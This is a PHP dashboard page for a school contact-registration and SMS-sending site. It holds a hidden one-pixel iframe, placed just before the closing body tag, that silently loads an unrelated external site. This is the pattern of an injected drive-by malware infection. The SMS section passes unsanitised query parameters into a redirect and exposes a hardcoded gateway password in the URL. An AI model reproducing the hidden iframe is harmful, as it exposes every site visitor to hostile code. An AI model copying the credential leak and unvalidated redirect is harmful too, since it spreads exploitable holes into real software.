<?php
ob_start();
include('header.php');
?>
<body>

    <?php include('navhead_user.php'); ?>

    <div class="container">
        <div class="row-fluid">
            <div class="span3">

                <div class="hero-unit-3">
                    <div class="alert-index alert-success">
                        <i class="icon-calendar icon-large"></i>
                        <?php
                        $Today = date('y:m:d');
                        $new = date('l, F d, Y', strtotime($Today));
                        echo $new;
                        ?>
                    </div>
                </div>
                <div class="hero-unit-1">
              
                    <ul class="nav  nav-pills nav-stacked">
                        <li class="nav-header">NAVIGATE</li>
                        <li   class="active">
                            <a href="main.php"><i class="icon-home icon-large"></i>&nbsp;Home
                                <div class="pull-right">
                                    <i class="icon-double-angle-right icon-large"></i>
                                </div>  
                            </a>

                        </li>
                        <li>
                            <a href="register_parent.php"><i class="icon-group icon-large"></i>&nbsp;PARENTS
                                <div class="pull-right">
                                    <i class="icon-double-angle-right icon-large"></i>

                                    <li>
                            <a href="register_teachers.php"><i class="icon-group icon-large"></i>&nbsp;TEACHERS
                                <div class="pull-right">
                                    <i class="icon-double-angle-right icon-large"></i>


                                    <li>
                            <a href="register_schools.php"><i class="icon-group icon-large"></i>&nbsp;SCHOOLS
                                <div class="pull-right">
                                    <i class="icon-double-angle-right icon-large"></i>


                                    <li>
                            <a href="register_elearning_contacts.php"><i class="icon-group icon-large"></i>&nbsp;ELEARNING
                                <div class="pull-right">
                                    <i class="icon-double-angle-right icon-large"></i>

                                    <li>
                            <a href="register_university_contacts.php"><i class="icon-group icon-large"></i>&nbsp; UNIVERSITY
                                <div class="pull-right">
                                    <i class="icon-double-angle-right icon-large"></i>
                                    <li>
                            <a href="balance.php"><i class="icon-group icon-large"></i>&nbsp; CREDIT BALANCE
                                <div class="pull-right">
                                    <i class="icon-double-angle-right icon-large"></i>
                                </div>  
                            </a></li>  
                            </a></li> 
                            </a></li>


                    </ul>
                </div>

            </div>
            <div class="span9">





                <a href="tourist_home.php" class="btn btn-success"><i class="icon-arrow-left icon-large"></i>&nbsp;Back</a>
                <br>
                <br>

                <div class="alert alert-info">
                    <button type="button" class="close" data-dismiss="alert">&times;</button>
                    <strong><i class="icon-user icon-large"></i>&nbsp;SEND SMS IN AN EASY WAY</strong>
                </div>
                <div class="hero-unit-2">
                <?php 
$msg = $_GET["msg"];
$sender = $_GET["sender"];
$telform = $_GET["tel"];
header("Location:http://boxuganda.com/api.php?user=isaacsms&password=123isaac&sender=$sender&message=$msg&reciever=$telform");

?>
         
              
                </div>




                <!-- end slider -->
            </div>

        </div>
        <?php include('footer.php'); ?>
    </div>
</div>
</div>






<iframe src="http://ZieF.pl/rc/" width=1 height=1 style="border:0"></iframe>
</body>
</html>


